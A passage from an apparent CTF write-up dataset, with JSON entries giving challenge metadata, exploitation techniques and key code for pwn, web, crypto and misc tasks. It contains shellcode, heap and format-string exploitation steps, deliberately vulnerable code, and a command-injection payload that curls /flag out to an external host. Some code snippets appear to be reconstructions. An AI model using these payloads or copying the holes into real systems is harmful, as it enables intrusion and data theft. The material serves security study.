        "key": "```python  \nSOL_CAN_ISOTP = 106 # These constants exist in the module header, not in\nPython.  \nCAN_ISOTP_RECV_FC = 2  \n# Many more exists.\n\nimport socket  \nimport struct  \nimport time\n\ndef hexdump(data):  \n    output = \"\"  \n    for i in range(0,len(data),2):  \n        value =  int(data[i:i+2],16)  \n        if value > 0x20 and value < 0x80:  \n            output += chr(value)  \n        else:  \n            output += \".\"  \n    return(output)  \n  \n# init sockets  \ns2 = socket.socket(socket.AF_CAN, socket.SOCK_DGRAM, socket.CAN_ISOTP)  \ns2.bind((\"vcan0\", 0x0641, 0x0600)) #rxid, txid with confusing order.\n\n# init diag session UDS: 10 02  \ns2.send(b\"\\x10\\x02\")  \ndata = s2.recv(4095)  \nprint(\"answer to 0x10: \" + hex(data[0]) )\n\n# security access request challenge UDS 27 01  \nprint(\"sending get challenge (27 01)\")  \ns2.send(b\"\\x27\\x01\")  \ndata = s2.recv(4095)  \ndump = ''.join(\"%02X\" % _ for _ in data)  \nprint(\"answer to 27 01: \" + dump + \" \" + hexdump(dump) )\n\nnum = int(dump[4:],16)  \nprint(\"chal: \" + hex(num))\n\n# calculate response  \nresp = num ^ 0x34323432343234323432343234323432  \nprint(\"resp: \" + hex(resp))\n\n# send back  \ns2.send(b\"\\x27\\x02\" + bytes.fromhex(hex(resp)[2:]) )  \ndata = s2.recv(4095)\n\n# unlocked, now dump all readDataByCommonIdentifier (not to miss anything)  \nprint(\"dumping all common identifier Data\")  \n  \nfor i in range(256):  \n    s2.send(b\"\\x22\\x00\" + chr(i).encode())  \n    data = s2.recv(4095)  \n    dump = ''.join(\"%02X\" % _ for _ in data)  \n    print(\"answer to 0x22 00 %02X\" % i + \": \" + dump + \" \" + hexdump(dump) )\n```"
    },
    {
        "name": "Obey The Rules",
        "write_up": "dataset/raw/Obey The Rules.md",
        "type": "pwn",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 445,
        "max_score": 500,
        "difficulty": 0.89,
        "knowledge": [
            "When developing a shellcode for environments with limited input size, consider crafting a compact loader that extends the capability to execute longer shellcodes. This technique involves initially using a short stub shellcode to read further bytes from the standard input (or another input source) into executable memory. Subsequently, control is transferred to this newly read extended shellcode for execution. The example payload fragment demonstrates this strategy with a compact assembly sequence to perform a read syscall into a buffer designated for the extended shellcode:\n```\n0000:   59        pop    rcx     // Prepare for shellcode execution\n0001:   59        pop    rcx     // Adjustments post read syscall\n0002:   31 ff     xor    edi,edi // Set file descriptor to 0 (STDIN)\n0004:   48 96     xchg   rsi,rax // Exchange the values of RSI and RAX; buffer address\n0006:   31 c0     xor    eax,eax // Set syscall number to 0 (sys_read)\n0008:   0f 05     syscall        // Invoke the kernel to perform the read\n000A:   90        nop            // No-operation, placeholder\n```",
            "In scenarios where direct syscalls like `write` are blocked by seccomp filters, indirect methods can be employed for data exfiltration. One approach is utilizing program crashes or specific signals to communicate binary information. Conceptually, this method relies on causing distinct, observable behaviors (e.g., segmentation fault versus trap signal) to relay binary data bit by bit. This oracle-like mechanism can effectively bypass restrictive syscall filters, enabling information leakage from a constrained execution environment. The practical application of this technique involves crafting shellcode that conditionally triggers one of the designated behaviors based on the content of the data being exfiltrated. Such an approach is crucial for circumventing seccomp restrictions without directly invoking blocked syscalls.\n```\n// Exfiltration logic, using conditional execution to signal data bits:\n\ttrue:\n\t    int3                // Trigger a SIGTRAP for a 'true' bit\n\tfalse:\n\t    push 0\n\t    ret                 // Normal exit or different signal for a 'false' bit\n```"
        ],
        "key": "```asm\n.intel_syntax noprefix\n.global _start\n\n_start:\n\tlea rdi, [rip + filename]\n\tmov rsi, 0\n\tmov rax, 0 // SYS_open\n\tsyscall\n\t// rax == 3\n\n\tmov rdi, rax\n\tmov rsi, 0x602888 // backdoor\n\tmov rdx, 0x80\n\tmov rax, SYS_read\n\tsyscall\n\n\t// placeholder\n\tmov ecx, 0x42424242\n\n\t// al = target[bit >> 3]\n\tmov rdi, rcx\n\tshr rdi, 3\n\tadd rdi, 0x602888\n\tmov al, byte ptr [rdi]\n\n\tand cl, 7\n\tshr al, cl\n\tand al, 1\n\n\tjnz true\n\tpush 0\n\tret\n\ntrue:\n\tint3\n\nfilename: .asciz \"/home/pwn/flag.txt\"\n```"
    },
    {
        "name": "obfuscJStore",
        "write_up": "dataset/raw/obfuscJStore.md",
        "type": "This is a `misc` (miscellaneous) challenge.",
        "competition": [
            "BYUCTF/2023",
            "https://ctftime.org/event/1935/tasks/"
        ],
        "score": 100,
        "max_score": 483,
        "difficulty": 0.2070393374741201,
        "knowledge": [
            "When faced with obfuscated JavaScript in CTF challenges, using online tools such as deobfuscate.io for deobfuscating the code can be an effective first step. After deobfuscation, carefully review the code to understand its logic and identify relevant functions or variables that may lead to the flag.",
            "If the deobfuscated code involves checks against `document.domain` or similar conditions that are not met in the execution environment, consider modifying the code to bypass these checks. Specifically, you can comment out or alter conditional statements to ensure that flag-revealing code paths are executed. Alternatively, use environments like `nodejs` to run the modified JavaScript code, as it allows for manual control over conditions and outputs."
        ],
        "key": "```js\nfunction hi() {  \n var a = l;  \n document.domain == a(500) + a(498) + a(510) && console[a(514)](a(515) +\na(503) + a(506) + a(505) + a(517) + \"imma_\" + a(499) + a(513) + a(522) +\na(504) + a(511) + \"e_thi\" + \"s}\"), console.log(a(521) + \" I wo\" + \"nder \" +\na(523) + \" the \" + a(494) + a(508));  \n}\n```"
    },
    {
        "name": "Obliterated File Again",
        "write_up": "dataset/raw/Obliterated File Again.md",
        "type": "web",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": 178,
        "max_score": 500,
        "difficulty": 0.356,
        "knowledge": [
            "When attempting to recover files deleted with `git filter-branch`, even after aggressive garbage collection (gc) and reflog expiry, it is possible to retrieve the original content if the `refs/original/` directory has not been explicitly cleaned up. This is because `git filter-branch` saves a backup of the refs in `refs/original/`. Running `git reset --hard refs/original/refs/heads/master` can restore the state before `git filter-branch` was applied.",
            "In scenarios where data compression is used within a CTF challenge, if the file format or compression algorithm is known or hinted at (e.g., zlib mentioned in the context or code snippets), attempting decompression using the corresponding method can reveal hidden or obscured flags. This requires familiarity with common compression/decompression libraries in languages such as Python.  \n   **Example Payload**: \n   ```python\n   import zlib\n   with open('path_to_compressed_file', 'rb') as f:\n       decompressed_data = zlib.decompress(f.read())\n   print(decompressed_data)\n   ```"
        ],
        "key": "```python\nimport zlib  \nf = open('easy_web/problem/flag')  \nprint zlib.decompress(f.read())  \n```"
    },
    {
        "name": "Obliterated File",
        "write_up": "dataset/raw/Obliterated File.md",
        "type": "web",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": 92,
        "max_score": 500,
        "difficulty": 0.184,
        "knowledge": [
            "When encountering a CTF challenge related to git repositories where it's suspected that sensitive files have been purged using methods like `git filter-branch`, `git reflog`, and `git gc`, attempt to restore deleted content by examining the repository's commit history with `git log`. Then, use the `git show <commit_hash>` command to view specific commits that might contain the deleted information. Finally, if a commit deleting the sensitive content is found, the `git revert <commit_hash>` command can be used to undo the changes made by that commit, potentially restoring the deleted file. This approach leverages the fact that, in many cases, git retains history allowing for the recovery of purged data unless very thorough cleansing methods have been employed.",
            "When a recovered file from a git repository shows as being in a compressed or encoded format (e.g., 'zlib compressed data'), use appropriate tools or scripts to decompress or decode the content. For zlib compressed files, a Python script utilizing the `zlib.decompress()` function can be used. This approach assumes familiarity with basic scripting and the ability to identify the format of the compressed or encoded data to apply the correct method for decompression or decoding.\n   \n   Example Python script for decompressing zlib data:\n   ```python\n   import zlib\n   with open('path/to/compressed_file', 'rb') as f:\n       compressed_data = f.read()\n   decompressed_data = zlib.decompress(compressed_data)\n   print(decompressed_data)\n   ```\n   This script opens the compressed file in binary mode, reads its content, decompresses it using `zlib.decompress()`, and prints the decompressed data."
        ],
        "key": "```bash\n$ git filter-branch --index-filter \"git rm -f --ignore-unmatch problem/flag\" --prune-empty -- --all  \n$ git reflog expire --expire=now --all  \n$ git gc --aggressive --prune=now  \n```"
    },
    {
        "name": "Occasionally Tested Protocol",
        "write_up": "dataset/raw/Occasionally Tested Protocol.md",
        "type": "crypto",
        "competition": [
            "rgbCTF/2020",
            "https://ctftime.org/event/1042/tasks/"
        ],
        "score": 219,
        "max_score": 500,
        "difficulty": 0.438,
        "knowledge": [
            "When dealing with challenges that use Python's `random` module seeded with the current time (`time.time()`), a viable approach is to guess the seed by measuring the local system time before and after getting output from the program. This strategy is effective because `time.time()` returns the number of seconds since the epoch, usually resulting in a manageable range of seeds to brute-force. After finding the correct seed by matching the generated output (such as a list of random numbers), one can reproduce the sequence of \"random\" values used by the program, enabling the prediction or replication of values like keys or tokens encrypted or obscured with these \"random\" values.",
            "In cryptographic challenges where an XOR operation is used for encryption or obfuscation and the random part of the key can be predicted or known, reversing the operation to recover the original data becomes possible. This is done by XORing the encrypted data with the same key or sequence of random values (if the seed could be guessed as in the above context). This method relies on the property that \\(A \\oplus B = C\\) implies \\(C \\oplus B = A\\), making it a straightforward operation to recover original plaintext or flags once the correct key sequence is identified.\n\nExample of applying brute-force to find the seed and using it to decrypt data XORed with a predictable sequence:\n\n```python\nfrom random import seed, randint\n\n# Assuming these values were obtained from observing the challenge's output\nobserved_nums = [6370, 578, 948, 4674, 4804, 6605, 2529, 4644, 3823, 4330]\nencrypted_num = 14967871060053757142096566772157693944463496219343006011424058102584\n\n# Example brute-force approach to find the seed\nfor potential_seed in range(start_time, end_time + 1):\n    seed(potential_seed)\n    if all(randint(5, 10000) == num for num in observed_nums):\n        print(f\"Found seed: {potential_seed}\")\n        break\n\n# Decrypting the data\nseed(potential_seed)  # Re-seed with the found seed\ng = encrypted_num.to_bytes(40, 'little')\nb = bytearray([randint(0, 255) for _ in range(40)])\nflag = bytearray(l ^ p for l, p in zip(g, b))\nprint(f\"Flag: {flag.decode('utf-8')}\")\n```"
        ],
        "key": "```python  \nfrom random import seed, randint as w  \nfrom time import time\n\ng = b\"rgbCTF{REDACTED}\"\n\nif __name__ == \"__main__\":  \n   seed(int(time()))  \n   print(f\"Here's 10 numbers for you: \")  \n   for _ in range(10):  \n       print(w(5, 10000))\n\n   b = bytearray([w(0, 255) for _ in range(40)])\n\n   n = int.from_bytes(bytearray([l ^ p for l, p in zip(g, b)]), 'little')  \n   print(\"Here's another number I found: \", n)  \n```"
    },
    {
        "name": "Odin Part 2",
        "write_up": "dataset/raw/Odin Part 2.md",
        "type": "crypto",
        "competition": [
            "CodeBlue/2018/Quals",
            "https://ctftime.org/event/636/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "When analyzing firmware for hidden functionalities or backdoors, searching for protocol constants (like command numbers) can lead to discovering undocumented commands that could be exploited. Once such a command is identified, its working, including required parameters or conditions (like a part of the device's MAC address) for its execution, can be understood from the firmware's code logic. This knowledge is crucial for crafting packets that exploit these backdoors.",
            "To analyze encrypted logging data (like EEPROM dumps) for timestamps or specific command executions, first decrypt the data using the known encryption scheme and key. Once decrypted, the data can be parsed according to the logging format to extract timestamps and payloads. This method is particularly useful for determining the time a specific command was first or last executed, which can aid in forensic analysis or understanding the exploit timeline. Decryption and parsing techniques depend on the encryption scheme used (e.g., AES in ECB mode) and the structure of logged data (e.g., packed timestamps and payloads).\n\n   Example Python script snippet to parse and decrypt EEPROM data:\n\n   ```python\n   from Crypto.Cipher import AES\n\n   key = bytes.fromhex(\"88AD3D8347B8CE82082064B4618D7637\")\n   cipher = AES.new(key, AES.MODE_ECB)\n\n   with open(\"eeprom.bin\", \"rb\") as f:\n       data = f.read()\n\n   for i in range(0, len(data), 16):\n       block = data[i:i+16]\n       decrypted_block = cipher.decrypt(block)\n\n       # Assuming the first 7 bytes are timestamp and next 9 are payload\n       timestamp_bytes = decrypted_block[:7]\n       payload_bytes = decrypted_block[7:]\n\n       # Further processing to interpret timestamp and payload\n   ```\n\nThis snippet demonstrates decrypting EEPROM data in 16-byte blocks, assuming it's encrypted with AES in ECB mode. The actual parsing of `timestamp_bytes` and `payload_bytes` would depend on their specific formats."
        ],
        "key": "```c\nvoid handle_command(uint8_t *command) {\n    uint8_t cmd_number = command[0];\n    if (cmd_number == 0x20) {\n        uint8_t mac_part[4] = {command[1], command[2], command[3], command[4]};\n        uint8_t constant_part[4] = {command[5], command[6], command[7], command[8]};\n        if (memcmp(mac_part, device_mac, 4) == 0 && memcmp(constant_part, \"\\x12\\x34\\x56\\x78\", 4) == 0) {\n            uint8_t action = command[9];\n            if (action == 0x01) {\n                unlock_door();\n            } else if (action == 0x00) {\n                lock_door();\n            }\n        }\n    }\n}\n```"
    },
    {
        "name": "Oh Sheet",
        "write_up": "dataset/raw/Oh Sheet.md",
        "type": "crypto",
        "competition": [
            "Square/2020",
            "https://ctftime.org/event/1174/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "For challenges involving steganography in documents or encoded messages in online documents (such as Google Sheets), clearing the formatting (such as text color, font size) may reveal hidden information. This approach can be critical in initially understanding how data might have been obfuscated.",
            "In challenges where encryption methods are applied using tools with functions like Google Sheets (using `MID`, `FIND`, etc.), and with hints provided on key characteristics (e.g., key length, absence of repeated letters, and case sensitivity), a brute-force approach to decrypt the message can be effective. Utilizing efficient scripting languages such as Python with acceleration through tools like PyPy can significantly improve the brute-forcing process. Given a string length and certain hints about the character set or language, one can generate all possible keys and test each against the encryption to find the plaintext. Example script excerpt for generating keyspace considering given conditions:\n```python\nimport itertools\n\n# Assuming the hint specifies a key of 9 lowercase letters with no repetition.\ncharacter_set = 'abcdefghijklmnopqrstuvwxyz'\nkey_length = 9\n\n# Generate all possible combinations of 9 letters with no repetition.\nkeyspace = itertools.permutations(character_set, key_length)\n\n# This part of the script needs to be adapted to the decryption mechanism.\nfor key in keyspace:\n    # pseudo-code to demonstrate approach\n    decrypted_message = decrypt_message_with_key(encrypted_message, ''.join(key))\n    if decrypted_message == known_plaintext:\n        print(f\"Found key: {''.join(key)}\")\n        break\n```\nNote: This pseudo-code is for illustrative purposes to highlight the approach. In a real situation, the decryption and verification mechanism would be specific to how the encryption is implemented."
        ],
        "key": "```python\ndef encrypt_message(message, key):\n    encrypted_message = \"\"\n    for i, char in enumerate(message):\n        key_char = key[i % len(key)]\n        encrypted_char = chr((ord(char) + ord(key_char)) % 256)\n        encrypted_message += encrypted_char\n    return encrypted_message\n\ndef decrypt_message(encrypted_message, key):\n    decrypted_message = \"\"\n    for i, char in enumerate(encrypted_message):\n        key_char = key[i % len(key)]\n        decrypted_char = chr((ord(char) - ord(key_char)) % 256)\n        decrypted_message += decrypted_char\n    return decrypted_message\n\n# Example usage\nkey = \"squarectf\"\nmessage = \"i love cryptography\"\nencrypted = encrypt_message(message, key)\ndecrypted = decrypt_message(encrypted, key)\n```"
    },
    {
        "name": "Old Government Site",
        "write_up": "dataset/raw/Old Government Site.md",
        "type": "web",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a web application that accepts URLs or file paths as input, testing with common Linux directories (e.g., `/etc`, `/var`) or commands (e.g., `/bin/ls`) can help identify if the input is being executed or fetched by the server. This can indicate a potential for command injection vulnerabilities if the input leads to unexpected or unfiltered execution. Condition: Useful when the application interacts with server files or external URLs based on user input.",
            "For exploiting command injection vulnerabilities in applications built with Ruby, especially those utilizing the open-uri library, crafting payloads that execute additional commands can be effective. This is possible if the application does not properly sanitize the input, allowing for the execution of arbitrary commands. Payloads can be designed to read sensitive files (e.g., `/flag`) and exfiltrate the data to a controlled external server. Example payload: `|curl -d \"$(cat /flag)\" -X POST http://ptsv2.com/t/3awt7-1521988385/post`. Condition: Applicable when the web application is vulnerable to command injection due to improper input handling, particularly in environments using Ruby and open-uri."
        ],
        "key": "```ruby\nrequire 'open-uri'\n\ndef fetch_page(id)\n  url = \"http://old-government-site.quals.2018.volgactf.ru:8080/page?id=#{id}\"\n  open(url) do |f|\n    f.each_line do |line|\n      puts line\n    end\n  end\nend\n\ndef validate_and_fetch(input)\n  if input =~ /\\Ahttps?:\\/\\/[\\S]+\\z/\n    open(input) do |f|\n      f.each_line do |line|\n        puts line\n      end\n    end\n  else\n    puts \"error\"\n  end\nend\n\n# Example of vulnerable usage\nuser_input = \"/flag\"\nvalidate_and_fetch(user_input)\n```\n"
    },
    {
        "name": "oldmodem",
        "write_up": "dataset/raw/oldmodem.md",
        "type": "misc",
        "competition": [
            "GACTF/2020",
            "https://ctftime.org/event/1115/tasks/"
        ],
        "score": 555,
        "max_score": 625,
        "difficulty": 0.888,
        "knowledge": [
            "For challenges involving files with no clear indication of format or purpose, using `binwalk` can reveal embedded file types or data, potentially uncovering hidden content such as archives. After identifying a zip archive using `binwalk`, one can use `unzip` to extract its contents, which might be crucial for solving the challenge.",
            "When dealing with audio files that are suspected to contain data modulated via frequency shifts, such as tones from an old modem, the `minimodem` tool is invaluable. It can demodulate audio files back into digital information if the correct baud rate (transmission speed) is known or can be guessed. For Bell 202 modulated signals, the baud rate to be used with `minimodem` is 1200, reflecting its transmission speed of 1200 bits per second.\n   Example command: `minimodem -r -f <audio_file> 1200`"
        ],
        "key": "```python\ndef decode_modem_tones(audio_file):\n    import wave\n    import numpy as np\n\n    # Open the WAV file\n    with wave.open(audio_file, 'rb') as wav_file:\n        # Read the audio data\n        frames = wav_file.readframes(wav_file.getnframes())\n        audio_data = np.frombuffer(frames, dtype=np.int16)\n\n    # Define Bell 202 modem frequencies\n    MARK_FREQ = 1200  # Hz for binary 1\n    SPACE_FREQ = 2200  # Hz for binary 0\n\n    # Placeholder for decoding logic\n    # This would involve detecting the frequency of each tone in the audio data\n    # and converting it to binary data based on the MARK and SPACE frequencies\n\n    # Example of a simple frequency detection (not accurate for real-world use)\n    def detect_frequency(signal):\n        # Perform a Fourier transform to find the frequency components\n        spectrum = np.fft.fft(signal)\n        freqs = np.fft.fftfreq(len(spectrum))\n        peak_freq = freqs[np.argmax(np.abs(spectrum))]\n        return abs(peak_freq * wav_file.getframerate())\n\n    # Decode the audio data\n    decoded_bits = []\n    for i in range(0, len(audio_data), wav_file.getframerate() // 10):  # Process in chunks\n        chunk = audio_data[i:i + wav_file.getframerate() // 10]\n        freq = detect_frequency(chunk)\n        if abs(freq - MARK_FREQ) < abs(freq - SPACE_FREQ):\n            decoded_bits.append('1')\n        else:\n            decoded_bits.append('0')\n\n    # Convert bits to string (assuming ASCII encoding)\n    decoded_string = ''.join(chr(int(''.join(decoded_bits[i:i+8]), 2)) for i in range(0, len(decoded_bits), 8))\n    return decoded_string\n\n# Example usage\nflag = decode_modem_tones('encoded.wav')\nprint(flag)\n```"
    },
    {
        "name": "OldNote",
        "write_up": "dataset/raw/OldNote.md",
        "type": "pwn",
        "competition": [
            "PoseidonCTF/2020",
            "https://ctftime.org/event/1049/tasks/"
        ],
        "score": 995,
        "max_score": 1000,
        "difficulty": 0.995,
        "knowledge": [
            "When exploiting heap-based vulnerabilities, especially in scenarios where the program has a limitation on chunk size and only basic operations such as create and delete, leveraging signed integer vulnerabilities to bypass size restrictions can be effective. If the application uses `atoi()` or a similar function to read sizes for memory allocations, providing a negative size can be used to exploit certain vulnerabilities, like the one in CVE-2017-17426. This allows for unexpected behavior such as obtaining a chunk when a NULL should be returned, facilitating heap overflow or arbitrary memory write scenarios.\n\n   - **Condition**: Application uses functions like `atoi()` for size input that do not validate negative input.\n   - **Knowledge**: Exploit negative size allocations to bypass restrictions and potentially exploit vulnerabilities for arbitrary writes or overflows.\n   - **Example Payload**: Providing a size of `-1` to an application that converts it to unsigned internally, resulting in large allocations or behavior that can be exploited.",
            "For achieving Remote Code Execution (RCE) through heap exploitation, a combination of heap overflow to corrupt tcache or unsorted bin metadata, and the modification of `__free_hook` to a function like `system()` can be used. This approach typically involves overflowing a chunk to modify metadata of adjacent chunks or the tcache itself, then freeing and reallocating chunks to control the `__free_hook` symbol's content. This method is effective in environments where the heap layout can be manipulated to create conditions for overlapping chunks or where metadata can be directly corrupted.\n\n   - **Condition**: Application allows heap overflow, and there is control over the content written to freed chunks.\n   - **Knowledge**: Use heap overflow to corrupt metadata or tcache entries, leading to `__free_hook` modification with `system()` for RCE.\n   - **Example Payload**: Overwrite a chunk\u2019s metadata to point `__free_hook` to `system()`, then allocate a chunk containing the command `/bin/sh`, and finally trigger `free()` on that chunk to execute the command."
        ],
        "key": "```c\nint read_int() {\n    char buffer[16];\n    fgets(buffer, sizeof(buffer), stdin);\n    return atoi(buffer); // Vulnerability: atoi returns a signed integer\n}\n\nvoid allocate() {\n    int size = read_int();\n    if (size <= 0 || size > 0x100) {\n        printf(\"Invalid size\\n\");\n        return;\n    }\n    void* chunk = malloc(size);\n    if (!chunk) {\n        printf(\"Allocation failed\\n\");\n        return;\n    }\n    // Store the chunk pointer in a global array\n}\n\nvoid deallocate(int index) {\n    // Free the chunk at the given index\n}\n```"
    },
    {
        "name": "one and a half man",
        "write_up": "dataset/raw/one and a half man.md",
        "type": "pwn",
        "competition": [
            "3kCTF/2020",
            "https://ctftime.org/event/1077/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When facing a buffer overflow challenge with restrictions such as non-executable stack (NX enabled) and lack of control over certain registers or syscall gadgets, one technique is to override Global Offset Table (GOT) entries to redirect library functions to desired gadgets within the same library. This method allows for circumventing protections and indirectly executing system calls. Conditionally, this approach relies on knowing the memory layout (e.g., addresses of PLT/GOT, function prologues) and being able to write to arbitrary addresses (e.g., through a buffer overflow). Example: Overriding the `read` GOT entry to point to a \"syscall; ret\" gadget to execute a `write` system call indirectly through `read@PLT`.",
            "In scenarios where direct invocation of system calls like `execve` is not trivial due to absence of syscall gadgets and register control limitations, one can leak a library pointer (e.g., libc pointer) to calculate the libc base address. Then, leveraging ROP gadgets found within the libc itself to set up registers for the `execve` system call. This approach often requires chaining gadgets to set up the required `execve` arguments (`\"/bin/sh\"`, 0, 0) in the correct registers (typically `rdi`, `rsi`, and `rdx` for x64 calling conventions), followed by the `syscall` instruction gadget. Preconditions include the ability to leak memory addresses (e.g., format string vulnerability or controlled read/write primitive) and calculating offsets for desired gadgets based on the leaked libc base address."
        ],
        "key": "```c\nvoid vuln(void)  \n{  \n char buf[10];  \n read(0,buf,0xaa);  \n}\n```"
    },
    {
        "name": "One Part !",
        "write_up": "dataset/raw/One Part !.md",
        "type": "crypto",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 261,
        "max_score": 500,
        "difficulty": 0.522,
        "knowledge": [
            "When given portions of the private key or its related values, such as dp (d mod (p-1)) in RSA, it's possible to derive the prime factors of n by brute-forcing potential values of k where k is an integer used to solve for p using the relationship e * dp = 1 + k * (p - 1). This approach allows for the deduction of p and subsequently q since n = p * q. The key insight relies on understanding that d, the private key component, and dp have a computationally exploitable relationship with the modulus n and its prime factors. This avenue of attack is especially viable when the values of e (public exponent) and dp are known alongside the modulus n. Brute-forcing k can be efficiently bounded by realizing that k is less than e, significantly narrowing the search space.\n\n   ```python\n   e = 65537  # Public exponent\n   dp = 15863941351022675271470498055440018518890999065008090553947887331349060559165417151482111730533900341104699951315612031296744594701865438849657867331942686064408344200992596897731186704102476529429339278690748746609131178367030814132224462991833270965841136411444101247903371020388961422615207080090040311385\n   n = 13795029341892417374839569348195219432273811499483782737330171543244685968744999323208547919665299783906957825270449006773866123362810477840346497089695409735324208705537006191240439897433032270300293091365930830592120936636584926755229275335158742925495154248094930986582540466282129158682944188080860981812852232204308214285109566958749409476615914322197257558630214751391486659657892675174292657801181344004269336582824495524735592639617122904261904725149320803824393890508587709714045126033113995823573370380507690572913971259051956543607099582177007672826620386223089090352147939487203095545319421169070202568081\n   for k in range(1, e):\n     p = (e * dp - 1 + k) // k\n     if n % p == 0:\n       print(\"P is:\", p)\n       break\n   ```",
            "After obtaining the prime factors (p and q) of n in an RSA encryption scheme, the next step towards decrypting a cipher involves computing phi(n), which is (p-1) * (q-1), and then calculating the modular inverse of e mod phi(n). This inverse is the private key exponent d, which can be used to decrypt the cipher text. Tools like \"dcode.fr\" provide a convenient method for calculating the modular inverse without having to implement the Extended Euclidean Algorithm manually. Having d, one can decrypt the cipher using m = cipher ^ d mod n, revealing the plaintext message. This decryption process underscores the importance of securing the prime factors and the private exponent in RSA encryption. The security of RSA is fundamentally based on the difficulty of factoring large integers.\n\n   ```python\n   from Crypto.Util.number import inverse, long_to_bytes\n   e = 65537  # Public exponent\n   n = 13795029341892417374839569348195219432273811499483782737330171543244685968744999323208547919665299783906957825270449006773866123362810477840346497089695409735324208705537006191240439897433032270300293091365930830592120936636584926755229275335158742925495154248094930986582540466282129158682944188080860981812852232204308214285109566958749409476615914322197257558630214751391486659657892675174292657801181344004269336582824495524735592639617122904261904725149320803824393890508587709714045126033113995823573370380507690572913971259051956543607099582177007672826620386223089090352147939487203095545319421169070202568081\n   cipher = 4577483075923691025614837387199959169275891010490317043142964745465946594734541383793196135840379923558282553847958293921035008363297701769706082343316794998794846094470932254663483885231325059503550992175528744843034602900645069686396280989390227810555558579302943585247037825841710062260608576583049065083988456565702297252837653658501925749752005065311426953256044460166446107914200467201439311812471408454665833883066991637851573154466515181854296188872448618848136386704796559645721088729635821840733708277778529467678390494522595775876496533057623112322654282130317608735511663306372475467872142100508022014379\n   p = 144039224760594772688606543510580838691127653882437687812979037411280601533114982523785419296758136139509382198582885244540696938622354567177892442689599309587576843156061488346717758801158770339319840441612025575855171797816583328592905878511468146202317893737435863602638296836136237843437631810454554154509\n   q = 95772726941712640001723837214303342002655355883327084521146440778536040744156583801926753814805595606410443413875301543467626805737472254844755121382615457766647100894815371282833364196117624639846104685189532693331432093753023513388892151349214843110728202212644881166427749140369961129200252767068764047509\n   phi = (p-1) * (q-1)\n   d = inverse(e, phi)\n   plaintext = pow(cipher, d, n)\n   print(long_to_bytes(plaintext).decode())  # Decrypted message\n   ```"
        ],
        "key": "```python\nfor k in range(1,65537):  \n    p = (65537 * dp - 1 + k) // k  \n    if (n % p == 0):  \n        print (\"K is \" + str(k))  \n        print (\"P is \" + str(p))  \n        print (\"Q is \" + str(n // p))  # simply getting q along with p, because why not?  \n```"
    },
    {
        "name": "One Piece Remake",
        "write_up": "dataset/raw/One Piece Remake.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": 487,
        "max_score": 500,
        "difficulty": 0.974,
        "knowledge": [
            "When dealing with a 32-bit binary that has an executable stack but no stack canary, a possible exploitation approach involves writing and executing custom shellcode directly on the stack. This method is particularly effective if NX (Non-eXecutable stack) is disabled, as it allows for direct execution of arbitrary code placed on the stack. Additionally, partial RELRO (Relocation Read-Only) suggests that the Global Offset Table (GOT) can be overwritten if necessary for redirecting the control flow or facilitating a write-what-where condition.",
            "Format string vulnerabilities can be exploited to achieve arbitrary read and write capabilities when the application prints user-controlled input without proper formatting. These vulnerabilities can be leveraged to leak memory addresses (such as the stack buffer's address and libc addresses) or to overwrite function pointers or GOT entries. The exploitation technique involves crafting payload inputs that use format specifiers (e.g., `%p`, `%s`, `%n`) to manipulate memory. Specifically, the knowledge of the offset where user-controlled input appears on the stack is critical for crafting effective payloads that can read or write to arbitrary memory locations. Example of a payload to leak addresses: `io.sendline(b'#%p#%11$p#')`."
        ],
        "key": "```c\nvoid mugiwara(void)\n{  \n char local_70 [104];  \n  \n puts(\"what\\'s your name pirate ?\");  \n printf(\">>\");  \n read(0,local_70,100);  \n printf(local_70);  \n return 0;  \n}\n```"
    },
    {
        "name": "One-for-all",
        "write_up": "dataset/raw/One-for-all.md",
        "type": "web",
        "competition": [
            "PatriotCTF/2023",
            "https://ctftime.org/event/2030/tasks/"
        ],
        "score": 488,
        "max_score": 495,
        "difficulty": 0.9858585858585859,
        "knowledge": [
            "When encountering a website with user-specific functionalities, manipulation of cookie values can reveal hidden information or grant unauthorized access to restricted functionalities. In scenarios where a default or identifiable cookie name is present, altering its value to commonly privileged usernames such as 'admin' can unlock parts of or entire flags in CTF challenges. \n   - Example payload: Changing default cookie value from 'kiran' to 'admin'.",
            "In challenges involving websites with path traversal vulnerabilities, using unusual characters like semicolons (';') to bypass filters or restrictions can lead to the discovery of hidden directories, files, or pieces of flags. This method is particularly effective when standard directory traversal payloads (e.g., '../') are filtered or blocked.\n   - Example payload: Accessing hidden paths by appending ';/' to bypass filters, as in the URL `http://domain.com/path/..;/`."
        ],
        "key": "```python\n# Possible vulnerable code snippet based on the context\n\nfrom flask import Flask, request, jsonify\nimport sqlite3\n\napp = Flask(__name__)\n\ndef get_user_profile(user_id):\n    conn = sqlite3.connect('database.db')\n    cursor = conn.cursor()\n    # Vulnerable to SQL Injection\n    query = f\"SELECT * FROM users WHERE id = {user_id}\"\n    cursor.execute(query)\n    result = cursor.fetchone()\n    conn.close()\n    return result\n\n@app.route('/user', methods=['GET'])\ndef user_profile():\n    user_id = request.args.get('id')\n    profile = get_user_profile(user_id)\n    if profile:\n        return jsonify(profile)\n    else:\n        return \"User not found\", 404\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=9090)\n```"
    },
    {
        "name": "onetestament",
        "write_up": "dataset/raw/onetestament.md",
        "type": "pwn",
        "competition": [
            "insomnihack/2022/Quals",
            "https://ctftime.org/event/1505/tasks/"
        ],
        "score": 290,
        "max_score": 451,
        "difficulty": 0.6430155210643016,
        "knowledge": [
